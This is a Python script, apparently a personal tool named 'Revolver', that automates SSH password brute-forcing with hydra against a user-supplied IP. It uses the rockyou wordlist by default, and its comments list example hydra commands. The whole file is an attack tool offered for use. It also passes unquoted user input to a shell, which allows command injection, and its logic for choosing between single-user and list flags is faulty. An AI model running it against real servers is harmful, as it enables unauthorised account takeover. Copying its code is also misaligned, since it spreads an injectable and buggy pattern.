# Description: This script is used to login to the ssh service using the hydra tool.
import subprocess

from termcolor import colored 
# Hydra Automation Script
#--------------------------------------------------------------------------------------------------
# -t 4 : Number of parallel tasks to run
# -I : Show login/password attempts in the screen
# -V : Verbose mode (show login+pass combination for each attempt)
# -l : Single username
# -L : Username list
# -p : Single password
# -P : Password list
# ssh://target : ssh service
#? Example: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://
#? Example: hydra -L /usr/share/wordlists/rockyou.txt -p password ssh://
#? Example: hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://
#--------------------------------------------------------------------------------------------------
#Funcions For Hydra Automation
def GetUser():
  #Getting username from user
  InputValid = input("Do you have username? (Y/N) : ")
  if InputValid.upper() == 'Y':
    UserName = input("[Hydra@Automation] $username : ")
  elif InputValid.upper() == 'N':
    #Default username list
    UserName = "/usr/share/wordlists/rockyou.txt"
  else:
    print("Enter valid input!")
    GetUser()# again call the function
  return UserName

def GetPassword():
  #Getting password from user
  InputValid = input("Do you have password? (Y/N) : ")
  if InputValid.upper() == 'Y':
    password = input("[Hydra@Automation] $password : ")
  elif InputValid.upper() == 'N':
    #Default password list
    password = "/usr/share/wordlists/rockyou.txt" #!default password list [Change the path according to your system]
  else:
    print("Enter valid input")
    GetPassword()
  return password

#Getting ip address from user
def GetIp():
  target = input("[Hydra@Automation] $target_ip : ")
  return target

#Getting user flag
def GetUserflag(input):
  if len(input) >= 2:
    flagUser = '-l' # -l [username]
    return flagUser
  else:
    flagUser = '-L' # -L [username list]
    return flagUser
  
#Getting password flag
def Getpassflag(input):
  if len(input) >= 16: #checking the length of the password
    flagPass = '-P' # -P [password list]
    return flagPass
  else:
    flagPass = '-p' # -p [password]
    return flagPass
  #Rainbow color
def print_rainbow(text):
    colors = ['cyan', 'blue',]
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        print(colored(char, color), end='')
    print()
def Revolver(): 
  print_rainbow("          ____  _______    ______  __ _    ____________ ")
  print_rainbow("         / __ \\/ ____/ |  / / __ \\/ /| |  / /____/ ___\\\\")	
  print_rainbow("        / /_/ / __/  | | / / / / / / | | / / __/ / /_/ / ")
  print_rainbow("       / _, _/ /___  | |/ / /_/ / /__| |/ / /___/ _, _/  ")
  print_rainbow("      /_/ |_/_____/  |___/\\____/_____/___/_____/_/ |_|   ")
  
def main():
  Revolver() #calling the revolver function
  UserName = GetUser()
  Password = GetPassword()
  target = GetIp()
  userFlag = GetUserflag(UserName)
  passFlag = Getpassflag(Password)
  print(f"[Hydra@Automation] $script : hydra {userFlag} {UserName} {passFlag} {Password} ssh://{target} -t 4 -I -V")
  print("Automation processing...")
  result = subprocess.run(f'hydra {userFlag} {UserName} {passFlag} {Password} ssh://{target} -t 4 -I -V', shell=True, stdout=subprocess.PIPE)
  output = result.stdout.decode("utf-8") #printing the result in structured format
  if "login:" in output:
        lines = output.split('\n')
        for line in lines:
            if "login:" in line:
                print(colored(line, 'white', 'on_red'))
            else:
                print(line)
  else:
        print(output)
    
  print("Automation completed!")
  print("Automated login to the server using SSH automation script ... by Hydra@Root~Revolver\n")
if __name__ == "__main__": #checking the main function
    main()

